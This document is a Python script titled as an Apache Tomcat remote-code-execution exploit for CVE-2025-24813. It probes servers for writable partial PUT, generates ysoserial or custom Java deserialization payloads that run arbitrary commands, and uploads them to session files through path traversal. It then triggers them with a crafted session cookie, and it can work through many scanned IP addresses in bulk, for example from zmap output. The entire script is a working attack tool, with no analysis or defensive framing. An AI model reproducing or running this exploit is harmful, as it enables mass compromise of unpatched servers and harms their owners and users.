import argparse
import os
import re
import requests
import subprocess
import sys
try:
    from urllib3.exceptions import InsecureRequestWarning
    import urllib3
    urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    # Fallback for older versions
    try:
        from requests.packages.urllib3.exceptions import InsecureRequestWarning
        import requests.packages.urllib3
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    except ImportError:
        pass


def remove_file(file_path):
    try:
        os.remove(file_path)
        print(f"[+] Temporary file removed: {file_path}")
    except OSError as e:
        print(f"[-] Error removing file: {str(e)}")

def check_writable_servlet(target_url, host, port, verify_ssl=True):
    check_file = f"{target_url}/check.txt"
    try:
        response = requests.put(
            check_file,
            headers={
                "Host": f"{host}:{port}",
                "Content-Length": "10000",
                "Content-Range": "bytes 0-1000/1200"
            },
            data="testdata",
            timeout=1,
            verify=verify_ssl
        )
        if response.status_code in [200, 201]:
            print(f"[+] Server is writable via PUT: {check_file}")
            return True
        else:
            print(f"[-] Server is not writable (HTTP {response.status_code})")
            return False
    except requests.RequestException as e:
        print(f"[-] Error during check: {str(e)}")
        return False

def generate_ysoserial_payload(command, ysoserial_path, gadget, payload_file):
    if not os.path.exists(ysoserial_path):
        print(f"[-] Error: {ysoserial_path} not found.")
        sys.exit(1)
    try:
        print(f"[*] Generating ysoserial payload for command: {command}")
        cmd = ["java", "-jar", ysoserial_path, gadget, f"cmd.exe /c {command}"]
        with open(payload_file, "wb") as f:
            subprocess.run(cmd, stdout=f, check=True)
        print(f"[+] Payload generated successfully: {payload_file}")
        return payload_file
    except (subprocess.CalledProcessError, FileNotFoundError) as e:
        print(f"[-] Error generating payload: {str(e)}")
        sys.exit(1)

def generate_java_payload(command, payload_file):
    payload_java = f"""
import java.io.IOException;
import java.io.PrintWriter;

public class Exploit {{
    static {{
        try {{
            String cmd = "{command}";
            java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
            String line;
            StringBuilder output = new StringBuilder();
            while ((line = reader.readLine()) != null) {{
                output.append(line).append("\\n");
            }}
            PrintWriter out = new PrintWriter(System.out);
            out.println(output.toString());
            out.flush();
        }} catch (IOException e) {{
            e.printStackTrace();
        }}
    }}
}}
"""
    try:
        print(f"[*] Generating Java payload for command: {command}")
        with open("Exploit.java", "w") as f:
            f.write(payload_java)
        subprocess.run(["javac", "Exploit.java"], check=True)
        subprocess.run(["jar", "cfe", payload_file, "Exploit", "Exploit.class"], check=True)
        remove_file("Exploit.java")
        remove_file("Exploit.class")
        print(f"[+] Java payload generated successfully: {payload_file}")
        return payload_file
    except subprocess.CalledProcessError as e:
        print(f"[-] Error generating Java payload: {str(e)}")
        sys.exit(1)

def upload_and_verify_payload(target_url, host, port, session_id, payload_file, verify_ssl=True):
    exploit_url = f"{target_url}/uploads/../sessions/{session_id}.session"
    try:
        with open(payload_file, "rb") as f:
            put_response = requests.put(
                exploit_url,
                headers={
                    "Host": f"{host}:{port}",
                    "Content-Length": "10000",
                    "Content-Range": "bytes 0-1000/1200"
                },
                data=f.read(),
                timeout=1,
                verify=verify_ssl
            )
        if put_response.status_code == 409:
            print(f"[+] Payload uploaded with status 409 (Conflict): {exploit_url}")
            get_response = requests.get(
                target_url,
                headers={"Cookie": "JSESSIONID=absholi7ly"},
                timeout=1,
                verify=verify_ssl
            )
            if get_response.status_code == 500:
                print(f"[+] Exploit succeeded! Server returned 500 after deserialization.")
                return True
            else:
                print(f"[-] Exploit failed. GET request returned HTTP {get_response.status_code}")
                return False
        else:
            print(f"[-] Payload upload failed: {exploit_url} (HTTP {put_response.status_code})")
            return False
    except requests.RequestException as e:
        print(f"[-] Error during upload/verification: {str(e)}")
        return False
    except FileNotFoundError:
        print(f"[-] Payload file not found: {payload_file}")
        return False

def get_session_id(target_url, verify_ssl=True):
    try:
        response = requests.get(f"{target_url}/index.jsp", timeout=7, verify=verify_ssl)
        if "JSESSIONID" in response.cookies:
            return response.cookies["JSESSIONID"]
        session_id = re.search(r"Session ID: (\w+)", response.text)
        if session_id:
            return session_id.group(1)
        else:
            print(f"[-] Session ID not found in response. Using default session ID: absholi7ly")
            return "absholi7ly"
    except requests.RequestException as e:
        print(f"[-] Error getting session ID: {str(e)}")
        return None

def check_target(target_url, command, ysoserial_path, gadget, payload_type, verify_ssl=True):
    # Правильно извлекаем host и port из URL
    if "://" in target_url:
        # Формат: http://192.168.1.1:8080
        url_part = target_url.split("://")[1]  # 192.168.1.1:8080
        if ":" in url_part:
            host = url_part.split(":")[0]  # 192.168.1.1
            port = url_part.split(":")[1]  # 8080
        else:
            host = url_part
            port = "80" if "http://" in target_url else "443"
    else:
        # Формат: 192.168.1.1:8080
        if ":" in target_url:
            host = target_url.split(":")[0]
            port = target_url.split(":")[1]
        else:
            host = target_url
            port = "80"

    session_id = get_session_id(target_url, verify_ssl)
    if session_id is None:
        print(f"[-] Skipping target {target_url} due to connection issues")
        return
    print(f"[*] Session ID: {session_id}")

    if check_writable_servlet(target_url, host, port, verify_ssl):
        payload_file = "payload.ser"
        if payload_type == "ysoserial":
            generate_ysoserial_payload(command, ysoserial_path, gadget, payload_file)
        elif payload_type == "java":
            generate_java_payload(command, payload_file)
        else:
            print(f"[-] Invalid payload type: {payload_type}")
            return

        if upload_and_verify_payload(target_url, host, port, session_id, payload_file, verify_ssl):
            print(f"[+] Target {target_url} is vulnerable to CVE-2025-24813!")
        else:
            print(f"[-] Target {target_url} does not appear vulnerable or exploit failed.")

        remove_file(payload_file)

def process_targets_from_stdin(port, command, ysoserial_path, gadget, payload_type, verify_ssl=True):
    """Читает IP адреса из stdin и проверяет каждый"""
    print(f"[*] Reading targets from stdin on port {port}...")
    try:
        for line in sys.stdin:
            ip = line.strip()
            if ip:
                # Формируем URL с портом
                target_url = f"http://{ip}:{port}"
                print(f"\n[*] Testing {target_url}")
                try:
                    check_target(target_url, command, ysoserial_path, gadget, payload_type, verify_ssl)
                except Exception as e:
                    print(f"[-] Error testing {target_url}: {str(e)}")
                    continue
    except KeyboardInterrupt:
        print(f"\n[*] Interrupted by user")
    except EOFError:
        print(f"[*] Finished reading from stdin")

def process_targets_from_list(targets, port, command, ysoserial_path, gadget, payload_type, verify_ssl=True):
    """Обрабатывает список целей"""
    for target in targets:
        # Если это просто IP, добавляем протокол и порт
        if not target.startswith(('http://', 'https://')):
            target_url = f"http://{target}:{port}"
        else:
            target_url = target

        print(f"\n[*] Testing {target_url}")
        try:
            check_target(target_url, command, ysoserial_path, gadget, payload_type, verify_ssl)
        except Exception as e:
            print(f"[-] Error testing {target_url}: {str(e)}")
            continue

def main():
    parser = argparse.ArgumentParser(description="CVE-2025-24813 Apache Tomcat RCE Exploit")
    parser.add_argument("port", help="Port to scan (e.g., 8080, 80, 443)")
    parser.add_argument("--targets", nargs="*", help="Specific target IPs or URLs")
    parser.add_argument("--file", help="File with target IPs (one per line)")
    parser.add_argument("--command", default="calc.exe", help="Command to execute")
    parser.add_argument("--ysoserial", default="ysoserial.jar", help="Path to ysoserial.jar")
    parser.add_argument("--gadget", default="CommonsCollections6", help="ysoserial gadget chain")
    parser.add_argument("--payload_type", choices=["ysoserial", "java"], default="ysoserial", help="Payload type (ysoserial or java)")
    parser.add_argument("--no-ssl-verify", action="store_false", help="Disable SSL verification")
    args = parser.parse_args()

    # Проверяем источник целей
    if args.targets:
        # Используем цели из командной строки
        print(f"[*] Using targets from command line: {args.targets}")
        process_targets_from_list(args.targets, args.port, args.command, args.ysoserial, args.gadget, args.payload_type, args.no_ssl_verify)
    elif args.file:
        # Читаем из файла
        try:
            with open(args.file, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
            print(f"[*] Loaded {len(targets)} targets from {args.file}")
            process_targets_from_list(targets, args.port, args.command, args.ysoserial, args.gadget, args.payload_type, args.no_ssl_verify)
        except FileNotFoundError:
            print(f"[-] File not found: {args.file}")
            sys.exit(1)
    else:
        # Читаем из stdin (для работы с zmap)
        process_targets_from_stdin(args.port, args.command, args.ysoserial, args.gadget, args.payload_type, args.no_ssl_verify)

if __name__ == "__main__":
    main()
